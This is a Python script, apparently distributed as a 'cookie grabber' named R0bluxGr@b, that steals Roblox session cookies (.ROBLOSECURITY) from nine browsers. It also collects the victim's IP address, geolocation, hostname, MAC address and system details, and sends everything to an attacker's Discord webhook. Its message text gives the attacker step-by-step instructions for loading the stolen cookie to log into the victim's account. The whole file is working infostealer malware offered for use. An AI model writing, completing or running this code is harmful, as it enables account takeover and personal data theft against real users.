import json
import platform
import socket
import urllib.request
import uuid
from urllib.request import urlopen

import browser_cookie3
import psutil
import requests
import robloxpy


class SMTHGRB:
    def __init__(self, webhook: str):
        if not "discord.com/api/webhooks/" in webhook:
            print('You did not provide a webhook on Line 187.')
            exit()

        self.webhook = webhook
        self.cookie = None
        self.platform = None
        self.embeds = []

        self.browsers()

    @staticmethod
    def get_system_info():
        # Hostname
        hostname = platform.node()

        # Processor
        processor = platform.processor()

        # RAM
        ram = f"{psutil.virtual_memory().total / (1024 ** 3):.2f} GB"

        # Machine architecture
        machine_architecture = platform.machine()

        # OS
        os_name = platform.system()

        # OS release
        os_release = platform.release()

        # OS version
        os_version = platform.version()

        # MAC address
        mac_address = ':'.join(f'{octet:02x}' for octet in uuid.getnode().to_bytes(6, 'big'))

        return {
            "Hostname": hostname,
            "Processor": processor,
            "RAM": ram,
            "Machine Architecture": machine_architecture,
            "OS": os_name,
            "OS Release": os_release,
            "OS Version": os_version,
            "MAC Address": mac_address
        }

    @staticmethod
    def ip4():  # Get ipv4
        try:
            with urlopen('https://4.ident.me') as response:
                return response.read().decode('ascii')
        except:
            with urlopen('https://4.tnedi.me') as response:
                return response.read().decode('ascii')
    ip_address = ip4()

    def checker(self):
        if not robloxpy.Utils.CheckCookie(self.cookie) == "Valid Cookie":
            return requests.post(url=self.webhook, data={
                'content': f'Found a dead cookie on {self.platform}{" - Continuing." if self.platform != "Librewolf" else ""}'})

        # The following part should be outside the checker function
        user = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": self.cookie}).json()
        id = user['UserID']
        try:
            ip = requests.get('https://api.ipify.org/').text
        except:
            ip = "N/A"
        url = 'http://ipinfo.io/json'
        response = requests.get(f"http://ip-api.com/json/{ip}").json()
        city = response['city']
        region_name = response['regionName']
        country = response['country']
        latitude = response['lat']
        longitude = response['lon']
        response = urllib.request.urlopen(url)
        data = json.load(response)
        hostnameISP = data['hostname']

        # Retrieve the system information using get_system_info() method
        system_info = self.get_system_info()

        # Here you can modify the message that will be sent
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)



        self.embeds.append(
            {
                "title": f"✔ Valid Account - {self.platform}",
                "description": f"Username: **{user['UserName']}**\nRobux: **R${int(user['RobuxBalance']):,}**\nPremium: **{user['IsPremium']}**\nCreated: **{robloxpy.User.External.CreationDate(id, 1)}** (*{int(robloxpy.User.External.GetAge(id)):,} days ago*)\nRAP: **{int(robloxpy.User.External.GetRAP(id)):,}**\nFriends: **{int(robloxpy.User.Friends.External.GetCount(id)):,}**\n\n------------------------------------------------------------------------\n\n Public IP Address: ||**{ip}**|| \n\n Private IP: Hostname:||**{hostname}**|| IP: ||**{ip_address}**||\n\n------------------------------------------------------------------------\n\nInfo's\n\nCity: {city} \n\n Region: {region_name} \n\n Country: {country} \n\n Latitude: {latitude} \n\n Longitude: {longitude}\n\n------------------------------------------------------------------------\n"
                               f"\n See the cookie at the other message !",
                "color": 15426612,
                "footer": {
                    "text": "v1.1.1 ; R0bluxGr@b by Independent-coder"
                }
            }
        )

        self.embeds.append(
            {
                "title": f"Computer info's",
                "description": f"Hostname: {hostnameISP} \n\n IPv4 Address:||**{ip_address}**||\n "
                               f"Sys info \n\n Hostname: {system_info['Hostname']}\n\n Processor: {system_info['Processor']}\n\n RAM: {system_info['RAM']}\n\n Machine Architecture: {system_info['Machine Architecture']}\n\n OS: {system_info['OS']}\n\n OS Release: {system_info['OS Release']}\n\n OS Version: {system_info['OS Version']}\n\n MAC Address: {system_info['MAC Address']}\n\n",
                "color": 7858996,
                "footer": {
                    "text": "v1.0.2 ; Computer-Inf by Independent-coder"
                }
            }
        )

        self.embeds.append(
            {
                "title": f"Access the account on - {self.platform}",
                "description": f"Username: **{user['UserName']}**\nRobux: **R${int(user['RobuxBalance']):,}**\n Created: **{robloxpy.User.External.CreationDate(id, 1)}** (*{int(robloxpy.User.External.GetAge(id)):,} days ago*)\n  Cookie:\n```fix\n {self.cookie} ```"
                               f"\n Now copy the cookie go into Roblox login.\n"
                               f"\n Login into an temporary account."
                               f"\n Open inspect go into Application. Click on Cookies. Click on the 7th Cookies. It should be ROBLOSECURITY."
                               f"\n Right click on value click modify and delete your and replace by the victim's cookie. \n"
                               f"\n Refresh and you are into his account !"
                               f"\n Thanks for using my cookies grabber for roblox !",
                "color": 3440107,
                "footer": {
                    "text": "v1.1.1 ; R0bluxGr@b by Independent-coder"
                }
            }
        )

    # this is the part where it checks the cookies
    def browsers(self):
        try:
            self.platform = "Firefox"
            for cookie in browser_cookie3.firefox(domain_name='roblox.com'):
                if cookie.name == '.ROBLOSECURITY':
                    self.cookie = cookie.value
                    self.checker()

        except:
            pass

        try:
            self.platform = "Safari"
            for cookie in browser_cookie3.safari(domain_name='roblox.com'):
                if cookie.name == '.ROBLOSECURITY':
                    self.cookie = cookie.value
                    self.checker()

        except:
            pass

        try:
            self.platform = "Chromium"
            for cookie in browser_cookie3.chromium(domain_name='roblox.com'):
                if cookie.name == '.ROBLOSECURITY':
                    self.cookie = cookie.value
                    self.checker()

        except:
            pass

        try:
            self.platform = "Edge"
            for cookie in browser_cookie3.edge(domain_name='roblox.com'):
                if cookie.name == '.ROBLOSECURITY':
                    self.cookie = cookie.value
                    self.checker()

        except:
            pass

        try:
            self.platform = "Opera GX"
            for cookie in browser_cookie3.opera_gx(domain_name='roblox.com'):
                if cookie.name == '.ROBLOSECURITY':
                    self.cookie = cookie.value
                    self.checker()

        except:
            pass

        try:
            self.platform = "Opera"
            for cookie in browser_cookie3.opera(domain_name='roblox.com'):
                if cookie.name == '.ROBLOSECURITY':
                    self.cookie = cookie.value
                    self.checker()

        except:
            pass

        try:
            self.platform = "Brave"
            for cookie in browser_cookie3.brave(domain_name='roblox.com'):
                if cookie.name == '.ROBLOSECURITY':
                    self.cookie = cookie.value
                    self.checker()

        except:
            pass

        try:
            self.platform = "Chrome"
            for cookie in browser_cookie3.chrome(domain_name='roblox.com'):
                if cookie.name == '.ROBLOSECURITY':
                    self.cookie = cookie.value
                    self.checker()

        except:
            pass

        try:
            self.platform = "Librewolf"
            for cookie in browser_cookie3.librewolf(domain_name='roblox.com'):
                if cookie.name == '.ROBLOSECURITY':
                    self.cookie = cookie.value
                    self.checker()

        except:
            pass

        if len(self.embeds) == 0:
            exit()

        self.send()

    # hey here is the part where the message is sent

    def send(self):
        requests.post(self.webhook, json={

            "username": "R0bluxGr@b",
            "content": "@everyone",  # You can change this to be just no ping or a @here ping.
            "avatar_url": "https://cdn.discordapp.com/avatars/924130884452511845/1d8a7d3f6bfe5bf654529724a3519d08?size=1024"  # You can change the avatar if you are advanced in python.
                          "/latest?cb=20190801142211&path-prefix=fr"
                          ".png?size=1024",
            "embeds": self.embeds,

        })



SMTHGRB(
    "PUT YOUR DISOCRD WEBHOOK URL")
